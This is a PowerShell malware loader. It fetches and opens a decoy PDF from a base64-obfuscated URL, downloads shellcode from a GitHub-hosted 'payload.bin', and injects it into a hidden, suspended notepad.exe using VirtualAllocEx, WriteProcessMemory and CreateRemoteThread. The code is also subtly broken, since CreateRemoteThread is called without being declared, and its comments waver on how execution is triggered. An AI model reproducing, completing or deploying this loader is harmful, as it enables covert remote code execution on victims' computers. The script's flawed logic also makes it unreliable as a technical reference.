# launcher.ps1 – Create suspended process and inject shellcode
$ErrorActionPreference = 'SilentlyContinue'

# Decoy PDF
$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LnBkZg=='))
$pdfPath = "$env:TEMP\nakaz.pdf"
Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing
Start-Process $pdfPath

$shellcodeUrl = "https://github.com/astro-opensource/cloud-sync-tools/raw/refs/heads/main/assets/payload.bin"
$shellcode = (Invoke-WebRequest -Uri $shellcodeUrl -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing).Content

# Win32 API for CreateProcess and injection
$code = @'
using System;
using System.Runtime.InteropServices;
public class Inject {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint ResumeThread(IntPtr hThread);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
}
'@
Add-Type $code

$si = New-Object Inject+STARTUPINFO
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
$si.dwFlags = 0x00000001  # STARTF_USESHOWWINDOW
$si.wShowWindow = 0  # SW_HIDE
$pi = New-Object Inject+PROCESS_INFORMATION

$success = [Inject]::CreateProcess($null, "notepad.exe", [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x00000004, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
if (-not $success) {
    Write-Host "CreateProcess failed"
    exit
}

$hProcess = $pi.hProcess
$hThread = $pi.hThread

$addr = [Inject]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $shellcode.Length, 0x1000, 0x40)
if ($addr -eq 0) {
    Write-Host "VirtualAllocEx failed"
    [Inject]::CloseHandle($hProcess)
    [Inject]::CloseHandle($hThread)
    exit
}

$bytesWritten = [IntPtr]::Zero
[Inject]::WriteProcessMemory($hProcess, $addr, $shellcode, $shellcode.Length, [ref]$bytesWritten)

# Resume the thread (it will execute the original notepad code, not our shellcode)
# We need to set the thread's entry point to our shellcode before resuming.
# Actually, with suspended process, we can use CreateRemoteThread to run our shellcode, then resume the main thread.
# Alternatively, we can patch the entry point. Simpler: create a remote thread and then resume the main thread.
# Let's just use CreateRemoteThread as before, but on the suspended process.

$remoteThread = [Inject]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
if ($remoteThread -eq 0) {
    Write-Host "CreateRemoteThread failed"
} else {
    Write-Host "Remote thread created"
}
[Inject]::ResumeThread($hThread)  # Resume main thread so notepad runs normally
[Inject]::CloseHandle($hProcess)
[Inject]::CloseHandle($hThread)
